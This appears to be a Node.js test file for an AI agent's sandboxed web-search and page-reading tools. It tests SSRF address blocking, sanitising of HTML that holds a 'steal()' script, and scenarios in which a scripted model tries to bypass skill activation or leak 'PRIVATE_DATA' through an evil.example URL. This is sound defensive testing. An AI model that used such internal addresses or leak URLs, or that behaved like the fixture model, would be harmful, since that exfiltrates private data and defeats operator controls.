import { usageFixture } from './fixtures/usage.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, cp, writeFile, rm, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { createHash } from 'node:crypto';
import {
  PublicReader,
  PublicWebTask,
  SearxSearch,
  publicUrl,
  publicAddress,
} from '../dist/runtime/public-web.js';
import { TrustedCatalog } from '../dist/runtime/catalog.js';
const signal = () => new AbortController().signal;
const response = (text, type = 'text/html; charset=utf-8') => ({
  status: 200,
  headers: { 'content-type': type },
  bytes: Buffer.from(text),
});
const dns = async () => [{ address: '93.184.215.14', family: 4 }];

test('public URL policy rejects local, private, reserved, mapped and obfuscated addresses', () => {
  for (const value of [
    '127.0.0.1',
    '0.0.0.0',
    '10.0.0.1',
    '169.254.169.254',
    '172.16.0.1',
    '192.168.1.1',
    '100.64.0.1',
    '224.0.0.1',
    '192.0.2.1',
    '::1',
    '::ffff:127.0.0.1',
    'fc00::1',
    'fe80::1',
    '2001:db8::1',
    '2002:7f00:1::',
  ])
    assert.equal(publicAddress(value), false, value);
  for (const value of [
    'http://example.com',
    'https://127.1',
    'https://2130706433',
    'https://0x7f000001',
    'https://[::ffff:127.0.0.1]',
    'https://localhost',
    'https://name.local',
    'https://metadata.internal',
    'https://example.com.',
    'https://user:pass@example.com',
    'https://example.com:444',
    'https://example.com/#x',
  ])
    assert.throws(() => publicUrl(value), { code: 'PUBLIC_URL_DENIED' }, value);
  assert.equal(publicUrl('https://example.com/a?q=b').hostname, 'example.com');
  assert.equal(publicAddress('2606:4700:4700::1111'), true);
});
test('DNS checks all answers, pins checked address, and rechecks every redirect', async () => {
  let wire = 0,
    lookups = 0;
  const reader = new PublicReader(
    async () => {
      lookups++;
      return await dns();
    },
    async (url, address) => {
      wire++;
      assert.equal(address.address, '93.184.215.14');
      return response('<title>Page</title><p>hello</p>');
    },
  );
  assert.equal((await reader.read('https://example.com', signal())).excerpt, 'hello');
  assert.equal(lookups, 1);
  assert.equal(wire, 1);
  for (const values of [[], [...(await dns()), { address: '127.0.0.1', family: 4 }]])
    await assert.rejects(
      new PublicReader(
        async () => values,
        () => {
          throw new Error('must not connect');
        },
      ).read('https://example.com', signal()),
      { code: 'PUBLIC_ADDRESS_DENIED' },
    );
  const redirect = new PublicReader(dns, async () => {
    wire++;
    return { status: 302, headers: { location: 'https://127.0.0.1/private' }, bytes: Buffer.alloc(0) };
  });
  await assert.rejects(redirect.read('https://example.com', signal()), { code: 'PUBLIC_URL_DENIED' });
  assert.equal(wire, 2);
  let hops = 0;
  const loop = new PublicReader(dns, async () => {
    hops++;
    return { status: 302, headers: { location: '/again' }, bytes: Buffer.alloc(0) };
  });
  await assert.rejects(loop.read('https://example.com', signal()), { code: 'PUBLIC_REDIRECT_LIMIT' });
  assert.equal(hops, 4);
});
test('reader extracts plain text, bounds bytes/text and rejects unsupported encodings', async () => {
  const html =
    '<title>Evidence</title><script>steal()</script><form>private input</form><nav>menu</nav><p>visible &amp; clear</p><div hidden>hidden</div><p>' +
    'x'.repeat(4100) +
    '</p>';
  const page = await new PublicReader(dns, async () => response(html, 'Text/HTML; charset="UTF-8"')).read(
    'https://example.com',
    signal(),
  );
  assert.equal(page.title, 'Evidence');
  assert.equal(page.excerpt.length, 4000);
  assert.equal(page.truncated, true);
  assert.ok(!/steal|private input|menu|hidden/.test(page.excerpt));
  assert.equal(page.sha256, createHash('sha256').update(page.excerpt).digest('hex'));
  for (const bad of [
    response('x'.repeat(524289)),
    response('x', 'application/pdf'),
    response('x', 'text/plain; charset=gbk'),
    { ...response('x'), headers: { 'content-encoding': 'gzip' } },
    { ...response('x'), bytes: Buffer.from([255]) },
  ])
    await assert.rejects(new PublicReader(dns, async () => bad).read('https://example.com', signal()));
});
test('cancel interrupts DNS and the actual transport signal', async () => {
  const controller = new AbortController();
  const waiting = new PublicReader(() => new Promise(() => {})).read(
    'https://example.com',
    controller.signal,
  );
  controller.abort();
  await assert.rejects(waiting);
  let closed = false;
  const bodyController = new AbortController();
  const reader = new PublicReader(
    dns,
    async (_url, _address, abort) =>
      await new Promise((resolve, reject) => {
        abort.addEventListener(
          'abort',
          () => {
            closed = true;
            reject(new Error('closed'));
          },
          { once: true },
        );
        bodyController.abort();
      }),
  );
  await assert.rejects(reader.read('https://example.com', bodyController.signal));
  assert.equal(closed, true);
});
test('SearXNG uses immutable query, filters unsafe results and only granted handles can be read', async () => {
  const sent = [];
  const reader = new PublicReader(dns, async (url) => {
    sent.push(url.href);
    return url.pathname === '/search'
      ? response(
          JSON.stringify({
            results: [
              { url: 'https://127.0.0.1', title: 'bad', content: 'bad' },
              ...[1, 2, 3, 4].map((i) => ({
                url: 'https://example.com/' + i,
                title: '<b>Title</b>',
                content: 'snippet',
              })),
            ],
          }),
          'application/json',
        )
      : response('<title>Read</title><p>actual page</p>');
  });
  const task = new PublicWebTask(
    'public topic',
    reader,
    new SearxSearch('https://search.example.com/search', reader),
  );
  const found = await task.find(signal());
  assert.equal(found.length, 3);
  assert.equal(new URL(sent[0]).searchParams.get('q'), 'public topic');
  assert.equal(found[0].kind, 'SEARCH');
  const page = await task.read(found[0].id, signal());
  assert.equal(page.kind, 'PAGE');
  assert.equal(page.excerpt, 'actual page');
  await assert.rejects(task.read('https://evil.example/', signal()), { code: 'PUBLIC_SOURCE_NOT_GRANTED' });
  const other = new PublicWebTask('https://example.com', reader);
  await other.find(signal());
  await assert.rejects(other.read(found[0].id, signal()), { code: 'PUBLIC_SOURCE_NOT_GRANTED' });
  await task.read(found[1].id, signal());
  await assert.rejects(task.read(found[2].id, signal()), { code: 'PUBLIC_READ_LIMIT' });
  await assert.rejects(new PublicWebTask('keywords', reader).find(signal()), {
    code: 'PUBLIC_SEARCH_NOT_CONFIGURED',
  });
});
test('catalog gates capabilities and fails unknown versions, tampering and symlinks', async (t) => {
  const folder = await mkdtemp(join(tmpdir(), 'dreamcore-catalog-'));
  t.after(() => rm(folder, { recursive: true, force: true }));
  await cp(new URL('../catalog/', import.meta.url), folder, { recursive: true });
  const catalog = await TrustedCatalog.load(pathToFileURL(folder + '/'));
  const internal = new Set(['search_sources']),
    all = new Set(['search_sources', 'public_search', 'read_public_page']);
  assert.deepEqual(
    catalog.available(internal).map((s) => s.id),
    ['source-review'],
  );
  await assert.rejects(catalog.activate('public-research', '1.0.0', internal), {
    code: 'SKILL_NOT_AVAILABLE',
  });
  await assert.rejects(catalog.activate('public-research', '2.0.0', all), { code: 'SKILL_NOT_AVAILABLE' });
  const loaded = await catalog.activate('public-research', '1.0.0', all);
  assert.ok(loaded.instructions.length);
  await writeFile(join(folder, 'public-research.md'), 'changed');
  await assert.rejects(catalog.activate('public-research', '1.0.0', all), { code: 'SKILL_INTEGRITY_FAILED' });
  await rm(join(folder, 'public-research.md'));
  await symlink(join(folder, 'source-review.md'), join(folder, 'public-research.md'));
  await assert.rejects(catalog.activate('public-research', '1.0.0', all), { code: 'SKILL_INTEGRITY_FAILED' });
});

test('actual Harness activates catalog before exposing web tools and never sends private prompt in query', async (t) => {
  const { createServer } = await import('node:http');
  const { randomUUID } = await import('node:crypto');
  const { listen, close, json, fixtureEngine } = await import('./fixtures/agent.mjs');
  const platform = createServer(
    (req, res) =>
      usageFixture(req, res) ||
      json(res, { allowed: true, executionClass: 'verification', publicQuery: 'public-only' }),
  );
  const url = await listen(platform);
  t.after(() => close(platform));
  const fixture = await fixtureEngine(url, 'synthetic-'.repeat(5), true);
  t.after(() => fixture.stop());
  const r = await fetch(fixture.url + '/internal/v1/agent-results', {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + 'synthetic-'.repeat(5) },
    body: JSON.stringify({
      contractVersion: '1.4',
      taskId: randomUUID(),
      attemptId: randomUUID(),
      prompt: 'PUBLIC_RESEARCH PRIVATE_CANARY',
    }),
  });
  const result = await r.json();
  assert.equal(r.status, 200, JSON.stringify(result));
  assert.equal(result.modelCalls, 5);
  assert.equal(result.skills[0].id, 'public-research');
  assert.equal(result.webSources[0].kind, 'PAGE');
  assert.ok(!result.webSources[0].excerpt.includes('fetch('));
  assert.equal(new URL(fixture.stats.webRequests[0]).searchParams.get('q'), 'public-only');
  assert.ok(!JSON.stringify(fixture.stats.webRequests).includes('PRIVATE_CANARY'));
});

test('model cannot bypass activation or supply arbitrary queries/URLs; no task grant means no web tools', async (t) => {
  const { createServer } = await import('node:http');
  const { randomUUID } = await import('node:crypto');
  const { AgentTasks } = await import('../dist/runtime/agent-task.js');
  const { listen, close, json } = await import('./fixtures/agent.mjs');
  let query = 'public-only',
    wire = 0;
  const server = createServer(
    (req, res) =>
      usageFixture(req, res) ||
      json(res, { allowed: true, executionClass: 'verification', publicQuery: query }),
  );
  const url = await listen(server);
  t.after(() => close(server));
  const reader = new PublicReader(dns, async () => {
    wire++;
    return response('unreachable');
  });
  for (const scenario of ['no-activation', 'query-injection', 'url-injection', 'no-grant', 'unknown-skill']) {
    query = scenario === 'no-grant' ? '' : 'public-only';
    let calls = 0;
    const agent = new AgentTasks({
      platformBaseUrl: url,
      executionClass: 'verification',
      modelName: 'fixture',
      publicWeb: { reader },
      createModel: () => ({
        async *generate(req) {
          calls++;
          if (calls === 1) {
            assert.ok(!req.tools.some((t) => t.name === 'public_search'));
            yield {
              type: 'tool_call',
              id: 'first',
              name: ['query-injection', 'url-injection'].includes(scenario)
                ? 'activate_skill'
                : scenario === 'unknown-skill'
                  ? 'activate_skill'
                  : 'public_search',
              arguments: JSON.stringify(
                scenario === 'unknown-skill'
                  ? { id: 'untrusted', version: '1.0.0' }
                  : ['query-injection', 'url-injection'].includes(scenario)
                    ? { id: 'public-research', version: '1.0.0' }
                    : {},
              ),
            };
            yield { type: 'finish', reason: 'tool_calls' };
            return;
          }
          if (calls === 2 && ['query-injection', 'url-injection'].includes(scenario)) {
            yield {
              type: 'tool_call',
              id: 'escape',
              name: scenario === 'query-injection' ? 'public_search' : 'read_public_page',
              arguments: JSON.stringify(
                scenario === 'query-injection'
                  ? { query: 'PRIVATE_DATA' }
                  : { id: 'https://evil.example/?leak=PRIVATE_DATA' },
              ),
            };
            yield { type: 'finish', reason: 'tool_calls' };
            return;
          }
          yield { type: 'text', text: 'I claim success' };
          yield { type: 'finish', reason: 'stop' };
        },
      }),
    });
    await assert.rejects(
      agent.run(
        { contractVersion: '1.4', taskId: randomUUID(), attemptId: randomUUID(), prompt: 'synthetic' },
        signal(),
      ),
    );
    agent.stop();
  }
  assert.equal(wire, 0);
});

test('revocation aborts an in-flight public read and cannot publish late snapshots', async (t) => {
  const { createServer } = await import('node:http');
  const { randomUUID } = await import('node:crypto');
  const { setTimeout: delay } = await import('node:timers/promises');
  const { AgentTasks } = await import('../dist/runtime/agent-task.js');
  const { listen, close, json } = await import('./fixtures/agent.mjs');
  let allowed = true,
    closed = false,
    calls = 0;
  let started;
  const reading = new Promise((resolve) => (started = resolve));
  const server = createServer(
    (req, res) =>
      usageFixture(req, res) ||
      json(
        res,
        { allowed, executionClass: 'verification', publicQuery: 'https://example.com/' },
        allowed ? 200 : 403,
      ),
  );
  const url = await listen(server);
  t.after(() => close(server));
  const reader = new PublicReader(
    dns,
    async (_url, _address, signal) =>
      await new Promise((resolve, reject) => {
        signal.addEventListener(
          'abort',
          () => {
            closed = true;
            reject(new Error('closed'));
          },
          { once: true },
        );
        started();
      }),
  );
  const agent = new AgentTasks({
    platformBaseUrl: url,
    executionClass: 'verification',
    modelName: 'fixture',
    publicWeb: { reader },
    createModel: () => ({
      async *generate(req) {
        calls++;
        let name, args;
        if (calls === 1) {
          name = 'activate_skill';
          args = { id: 'public-research', version: '1.0.0' };
        } else if (calls === 2) {
          name = 'public_search';
          args = {};
        } else {
          const last = req.messages
            .flatMap((m) => m.content)
            .filter((b) => b.type === 'tool_result')
            .at(-1);
          const data = JSON.parse(JSON.parse(last.content)[0].text);
          name = 'read_public_page';
          args = { id: data.items[0].id };
        }
        yield { type: 'tool_call', id: 'call' + calls, name, arguments: JSON.stringify(args) };
        yield { type: 'finish', reason: 'tool_calls' };
      },
    }),
  });
  t.after(() => agent.stop());
  const running = agent.run(
    { contractVersion: '1.4', taskId: randomUUID(), attemptId: randomUUID(), prompt: 'synthetic' },
    signal(),
  );
  // Attach rejection immediately, so cancellation never creates an unhandled rejection.
  const rejected = assert.rejects(running);
  await Promise.race([
    reading,
    delay(3000).then(() => {
      throw new Error('read never started');
    }),
  ]);
  allowed = false;
  await rejected;
  assert.equal(closed, true);
  assert.equal(calls, 3);
});
test('parallel duplicate web calls share one request and do not multiply task grants', async () => {
  let reads = 0,
    searches = 0;
  const reader = new PublicReader(dns, async () => {
    reads++;
    return response('page', 'text/plain');
  });
  const task = new PublicWebTask('topic', reader, {
    async search() {
      searches++;
      return [
        { id: 'opaque', url: 'https://example.com', title: 'page', excerpt: 'snippet', kind: 'SEARCH' },
      ];
    },
  });
  const [a, b] = await Promise.all([task.find(signal()), task.find(signal())]);
  assert.deepEqual(a, b);
  assert.equal(searches, 1);
  const [one, two] = await Promise.all([task.read(a[0].id, signal()), task.read(a[0].id, signal())]);
  assert.deepEqual(one, two);
  assert.equal(reads, 1);
  assert.equal(task.snapshot().length, 1);
});
